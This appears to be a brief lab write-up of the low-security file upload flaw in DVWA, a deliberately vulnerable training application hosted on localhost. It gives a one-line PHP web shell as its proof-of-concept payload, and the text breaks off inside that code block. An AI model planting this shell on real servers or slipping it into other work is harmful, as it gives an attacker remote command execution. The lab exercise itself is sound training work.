# DVWA — File Upload (low)

**Target:** http://127.0.0.1/dvwa/vulnerabilities/upload/  
**Date:** 2025-09-26  
**Severity:** High

## Summary
DVWA’s file upload function does not validate file type or sanitize uploaded content. This allows arbitrary files (including scripts or web shells) to be uploaded and executed.

## PoC (reproducible)
**Payload:** `shell.php` with contents:
```php
<?php system($_GET['cmd']); ?>
